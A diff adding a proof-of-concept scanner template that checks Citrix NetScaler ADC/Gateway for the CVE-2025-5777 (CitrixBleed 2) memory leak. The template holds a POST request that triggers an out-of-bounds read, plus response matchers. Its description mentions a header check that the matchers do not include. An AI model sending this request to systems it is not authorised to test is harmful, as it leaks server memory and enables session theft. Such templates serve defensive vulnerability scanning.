@@ -1,0 +1,43 @@
+[info]
+author = "ave"
+description = "检测 Citrix NetScaler ADC/Gateway 的 /p/u/doAuthentication.do 端点是否存在 CVE-2025-5777 (CitrixBleed 2) 内存泄露漏洞。发送 POST 请求触发内存越界读取，若响应体包含 <InitialValue> 非空标签且响应头包含 application/vnd.citrix.authenticateresponse，表明漏洞存在。"
+id = "POC-AVE-2025-0108"
+name = "Citrix NetScaler ADC/Gateway 内存信息泄露漏洞 PoC"
+severity = "critical"
+tags = [
+    "cve-2025-5777",
+    "citrix",
+    "netscaler",
+    "citrixbleed",
+    "memory-leak",
+]
+vuln_id = [
+    "CVE-2025-5777",
+    "AVE-2025-0108",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/p/u/doAuthentication.do"
+protocol = "http"
+
+[poc.requests.body]
+content = "login"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<InitialValue>"]
